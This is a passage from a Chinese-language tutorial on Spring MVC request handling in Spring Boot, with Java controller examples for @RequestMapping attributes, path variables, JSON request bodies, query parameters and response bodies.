<h4 id="4-2-1-指定请求路径"><a href="#4-2-1-指定请求路径" class="headerlink" title="4.2.1 指定请求路径"></a>4.2.1 指定请求路径</h4><p>​    path或者value属性都可以用来指定请求路径。</p>
<p>例如：</p>
<p>​    我们期望让请求的资源路径为**/test/testPath<strong>的请求能够被</strong>testPath**方法处理则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/testPath&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testPath</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testPath&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test/testPath&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testPath</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testPath&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-2-2-指定请求方式"><a href="#4-2-2-指定请求方式" class="headerlink" title="4.2.2 指定请求方式"></a>4.2.2 指定请求方式</h4><p>​    method属性可以用来指定可处理的请求方式。</p>
<p>例如：</p>
<p>​    我们期望让请求的资源路径为**/test/testMethod<strong>的</strong>POST<strong>请求能够被</strong>testMethod**方法处理。则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testMethod&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testMethod处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testMethod&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>注意：我们可以也可以运用如下注解来进行替换</p>
<ul>
<li><p>​    @PostMapping    等价于   @RequestMapping(method = RequestMethod.POST) </p>
</li>
<li><p>​    @GetMapping    等价于   @RequestMapping(method = RequestMethod.GET) </p>
</li>
<li><p>​    @PutMapping    等价于   @RequestMapping(method = RequestMethod.PUT) </p>
</li>
<li><p>​    @DeleteMapping    等价于   @RequestMapping(method = RequestMethod.DELETE) </p>
</li>
</ul>
<p>例如：</p>
<p>​    上面的需求我们可以使用下面的写法实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/testMethod&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testMethod处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testMethod&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-2-3-指定请求参数"><a href="#4-2-3-指定请求参数" class="headerlink" title="4.2.3 指定请求参数"></a>4.2.3 指定请求参数</h4><p>​    我们可以使用<strong>params</strong>属性来对请求参数进行一些限制。可以要求必须具有某些参数，或者是某些参数必须是某个值，或者是某些参数必须不是某个值。</p>
<p>例如：</p>
<p>​    我们期望让请求的资源路径为**/test/testParams<strong>的</strong>GET<strong>请求,并且请求参数中</strong>具有code参数**的请求能够被testParams方法处理。则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testParams&quot;,method = RequestMethod.GET,params = &quot;code&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testParams</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testParams处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testParams&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>​    如果是要求<strong>不能有code</strong>这个参数可以把改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testParams&quot;,method = RequestMethod.GET,params = &quot;!code&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testParams</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testParams处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testParams&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>​    如果要求有code这参数，并且这参数值必须<strong>是某个值</strong>可以改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testParams&quot;,method = RequestMethod.GET,params = &quot;code=sgct&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testParams</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testParams处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testParams&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​    如果要求有code这参数，并且这参数值必须<strong>不是某个值</strong>可以改成如下形式    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testParams&quot;,method = RequestMethod.GET,params = &quot;code!=sgct&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testParams</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testParams处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testParams&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-2-4-指定请求头"><a href="#4-2-4-指定请求头" class="headerlink" title="4.2.4 指定请求头"></a>4.2.4 指定请求头</h4><p>​    我们可以使用<strong>headers</strong>属性来对请求头进行一些限制。</p>
<p>例如：</p>
<p>​    我们期望让请求的资源路径为**/test/testHeaders的<strong>GET</strong>请求,并且请求头中<strong>具有</strong>deviceType**的请求能够被testHeaders方法处理。则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testHeaders&quot;,method = RequestMethod.GET,headers = &quot;deviceType&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHeaders</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testHeaders处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testHeaders&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​    如果是要求不能有<strong>deviceType</strong>这个请求头可以把改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testHeaders&quot;,method = RequestMethod.GET,headers = &quot;!deviceType&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHeaders</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testHeaders处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testHeaders&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​    如果要求有deviceType这个请求头，并且其值必须<strong>是某个值</strong>可以改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testHeaders&quot;,method = RequestMethod.GET,headers = &quot;deviceType=ios&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHeaders</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testHeaders处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testHeaders&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​    如果要求有deviceType这个请求头，并且其值必须<strong>不是某个值</strong>可以改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testHeaders&quot;,method = RequestMethod.GET,headers = &quot;deviceType!=ios&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHeaders</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testHeaders处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testHeaders&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-2-5-指定请求头Content-Type"><a href="#4-2-5-指定请求头Content-Type" class="headerlink" title="4.2.5 指定请求头Content-Type"></a>4.2.5 指定请求头Content-Type</h4><p>​    我们可以使用<strong>consumes</strong>属性来对<strong>Content-Type</strong>这个请求头进行一些限制。</p>
<h5 id="范例一"><a href="#范例一" class="headerlink" title="范例一"></a>范例一</h5><p>​    我们期望让请求的资源路径为**/test/testConsumes**的POST请求,并且请求头中的Content-Type头必须为 <strong>multipart/from-data</strong> 的请求能够被testConsumes方法处理。则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/testConsumes&quot;,method = RequestMethod.POST,consumes = &quot;multipart/from-data&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testConsumes</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testConsumes处理了请求&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testConsumes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="范例二"><a href="#范例二" class="headerlink" title="范例二"></a>范例二</h5><p>​    如果我们要求请求头Content-Type的值必须<strong>不能为某个multipart/from-data</strong>则可以改成如下形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/testConsumes&quot;,method = RequestMethod.POST,consumes = &quot;!multipart/from-data&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testConsumes</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testConsumes处理了请求&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testConsumes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-获取请求参数"><a href="#4-3-获取请求参数" class="headerlink" title="4.3 获取请求参数"></a>4.3 获取请求参数</h3><h4 id="4-3-1-获取路径参数"><a href="#4-3-1-获取路径参数" class="headerlink" title="4.3.1 获取路径参数"></a>4.3.1 获取路径参数</h4><h5 id="RestFul风格"><a href="#RestFul风格" class="headerlink" title="RestFul风格"></a>RestFul风格</h5><p>​    RestFul风格的接口一些参数是在请求路径上的。类似： /user/1  这里的1就是id。</p>
<p>​    如果我们想获取这种格式的数据可以使用**@PathVariable**来实现。</p>
<h5 id="范例一-1"><a href="#范例一-1" class="headerlink" title="范例一"></a>范例一</h5><p>​    要求定义个RestFul风格的接口，该接口可以用来根据id查询用户。请求路径要求为  /user  ，请求方式要求为GET。</p>
<p>​    而请求参数id要写在请求路径上，例如  /user/1   这里的1就是id。</p>
<p>​    我们可以定义如下方法，通过如下方式来获取路径参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/user/&#123;id&#125;&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findUserById</span><span class="params">( <span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;findUserById&quot;</span>);</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;findUserById&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="范例二-1"><a href="#范例二-1" class="headerlink" title="范例二"></a>范例二</h5><p>​    如果这个接口，想根据id和username查询用户。请求路径要求为  /user  ，请求方式要求为GET。</p>
<p>​    而请求参数id和name要写在请求路径上，例如  /user/1/zs   这里的1就是id，zs是name</p>
<p>​    我们可以定义如下方法，通过如下方式来获取路径参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/user/&#123;id&#125;/&#123;name&#125;&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findUser</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,<span class="meta">@PathVariable(&quot;name&quot;)</span> String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;findUser&quot;</span>);</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;findUser&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-3-2-获取请求体中的Json格式参数"><a href="#4-3-2-获取请求体中的Json格式参数" class="headerlink" title="4.3.2 获取请求体中的Json格式参数"></a>4.3.2 获取请求体中的Json格式参数</h4><p>​    RestFul风格的接口一些比较复杂的参数会转换成Json通过请求体传递过来。这种时候我们可以使用**@RequestBody**注解获取请求体中的数据。</p>
<h5 id="4-3-2-1-配置"><a href="#4-3-2-1-配置" class="headerlink" title="4.3.2.1 配置"></a>4.3.2.1 配置</h5><p>​    SpringBoot的web启动器已经默认导入了jackson的依赖，不需要再额外导入依赖了。</p>
<h5 id="4-3-2-2-使用"><a href="#4-3-2-2-使用" class="headerlink" title="4.3.2.2 使用"></a>4.3.2.2 使用</h5><h6 id="范例一-2"><a href="#范例一-2" class="headerlink" title="范例一"></a>范例一</h6><p>​    要求定义个RestFul风格的接口，该接口可以用来新建用户。请求路径要求为  /user  ，请求方式要求为POST。</p>
<p>用户数据会转换成json通过请求体传递。<br>​    请求体数据</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;三更&quot;</span>,<span class="attr">&quot;age&quot;</span>:<span class="number">15</span>&#125;</span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>1.获取参数封装成实体对象</p>
<p>​    如果我们想把Json数据获取出来封装User对象,我们可以这样定义方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">insertUser</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;insertUser&quot;</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;insertUser&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    User实体类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>2.获取参数封装成Map集合</p>
<p>​    也可以把该数据获取出来封装成Map集合：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">insertUser</span><span class="params">(<span class="meta">@RequestBody</span> Map map)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;insertUser&quot;</span>);</span><br><span class="line">    System.out.println(map);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;insertUser&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h6 id="范例二-2"><a href="#范例二-2" class="headerlink" title="范例二"></a>范例二</h6><p>​    如果请求体传递过来的数据是一个User集合转换成的json，Json数据可以这样定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;三更1&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">14</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;三更2&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">15</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;三更3&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">16</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>​    方法定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/users&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">insertUsers</span><span class="params">(<span class="meta">@RequestBody</span> List&lt;User&gt; users)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;insertUsers&quot;</span>);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;insertUser&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="4-3-2-3-注意事项"><a href="#4-3-2-3-注意事项" class="headerlink" title="4.3.2.3 注意事项"></a>4.3.2.3 注意事项</h5><p>​    <label style="background:yellow">如果需要使用@RequestBody来获取请求体中Json并且进行转换，要求请求头 Content-Type 的值要为： application/json 。</label></p>
<h4 id="4-3-3-获取QueryString格式参数"><a href="#4-3-3-获取QueryString格式参数" class="headerlink" title="4.3.3 获取QueryString格式参数"></a>4.3.3 获取QueryString格式参数</h4><p>​    如果接口的参数是使用QueryString的格式的话，我们也可以使用SpringMVC快速获取参数。</p>
<p>​    我们可以使用**@RequestParam**来获取QueryString格式的参数。</p>
<h5 id="4-3-3-1-使用"><a href="#4-3-3-1-使用" class="headerlink" title="4.3.3.1 使用"></a>4.3.3.1 使用</h5><h6 id="范例一-3"><a href="#范例一-3" class="headerlink" title="范例一"></a>范例一</h6><p>​    要求定义个接口，该接口请求路径要求为  /testRequestParam，请求方式无要求。参数为id和name和likes。使用QueryString的格式传递。</p>
<p>1.参数单独的获取</p>
<p>​    如果我们想把id，name，likes单独获取出来可以使用如下写法：</p>
<p>​    在方法中定义方法参数，方法参数名要和请求参数名一致，这种情况下我们可以省略**@RequestParam**注解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(Integer id, String name, String[] likes)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(id);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    如果方法参数名和请求参数名不一致，我们可以加上**@RequestParam**注解例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(<span class="meta">@RequestParam(&quot;id&quot;)</span> Integer uid,<span class="meta">@RequestParam(&quot;name&quot;)</span> String name, <span class="meta">@RequestParam(&quot;likes&quot;)</span>String[] likes)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(uid);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2.获取参数封装成实体对象</p>
<p>​    如果我们想把这些参数封装到一个User对象中可以使用如下写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(User user)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    User类定义如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String[] likes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    测试时请求url如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/testRquestParam?id=1&amp;name=三更草堂&amp;likes=编程&amp;likes=录课&amp;likes=烫头</span></span><br></pre></td></tr></table></figure>



<p>​    <strong>注意：实体类中的成员变量要和请求参数名对应上。并且要提供对应的set/get方法。</strong></p>
<h4 id="4-3-4-相关注解其他属性"><a href="#4-3-4-相关注解其他属性" class="headerlink" title="4.3.4 相关注解其他属性"></a>4.3.4 相关注解其他属性</h4><h5 id="4-3-4-1-required"><a href="#4-3-4-1-required" class="headerlink" title="4.3.4.1 required"></a>4.3.4.1 required</h5><p>​    代表是否必须，默认值为true也就是必须要有对应的参数。如果没有就会报错。</p>
<p>​    如果对应的参数可传可不传则可以把其设置为fasle</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(<span class="meta">@RequestParam(value = &quot;id&quot;,required = false)</span> Integer uid,<span class="meta">@RequestParam(&quot;name&quot;)</span> String name, <span class="meta">@RequestParam(&quot;likes&quot;)</span>String[] likes)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(uid);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="4-3-4-2-defaultValue"><a href="#4-3-4-2-defaultValue" class="headerlink" title="4.3.4.2 defaultValue"></a>4.3.4.2 defaultValue</h5><p>​    如果对应的参数没有，我们可以用defaultValue属性设置默认值。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(<span class="meta">@RequestParam(value = &quot;id&quot;,required = false,defaultValue = &quot;777&quot;)</span> Integer uid,<span class="meta">@RequestParam(&quot;name&quot;)</span> String name, <span class="meta">@RequestParam(&quot;likes&quot;)</span>String[] likes)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(uid);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-响应体响应数据"><a href="#4-4-响应体响应数据" class="headerlink" title="4.4 响应体响应数据"></a>4.4 响应体响应数据</h3><p>​    无论是RestFul风格还是我们之前web阶段接触过的异步请求，都需要把数据转换成Json放入响应体中。</p>
<h4 id="4-4-1-数据放到响应体"><a href="#4-4-1-数据放到响应体" class="headerlink" title="4.4.1 数据放到响应体"></a>4.4.1 数据放到响应体</h4><p>​    我们的SpringMVC为我们提供了**@ResponseBody**来非常方便的把Json放到响应体中。</p>
<p>​    <strong>@ResponseBody</strong>可以加在哪些东西上面？类上和方法上</p>
<p>​    具体代码请参考范例。</p>
<h4 id="4-4-2-数据转换成Json"><a href="#4-4-2-数据转换成Json" class="headerlink" title="4.4.2 数据转换成Json"></a>4.4.2 数据转换成Json</h4><h5 id="4-4-2-1-配置"><a href="#4-4-2-1-配置" class="headerlink" title="4.4.2.1 配置"></a>4.4.2.1 配置</h5><p>​    SpringBoot项目中使用了web的start后，不需要进行额外的依赖和配置</p>
